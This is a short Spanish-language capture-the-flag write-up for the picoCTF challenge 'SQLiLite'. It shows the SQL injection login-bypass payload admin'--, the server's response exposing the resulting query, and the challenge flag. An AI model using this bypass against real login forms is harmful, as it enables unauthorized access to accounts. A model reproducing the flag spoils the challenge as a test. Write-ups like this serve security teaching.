# SQLiLite

## Descripcion
Can you login to this website?Try to login [here](http://saturn.picoctf.net:64189/).
## Solucion
Nos conectamos al reto con el link que nos dan
Por el nombre del reto, podemos intuir que es un reto de inyeccion SQL, entonces probamos a usar el siguiente payload:
```
username: admin'--
password: asdasdasdasd
```

Y nos dice estamos loggeados pero no podemos ver la flag, entonces simplemente vemos el codigo fuente y ya esta:
```html
<pre>username: admin&#039;--password: adminSQL query: SELECT * FROM users WHERE name=&#039;admin&#039;--&#039; AND password=&#039;admin&#039;</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>
```

```flag
picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
```
## Notas adicionales

## Referencias
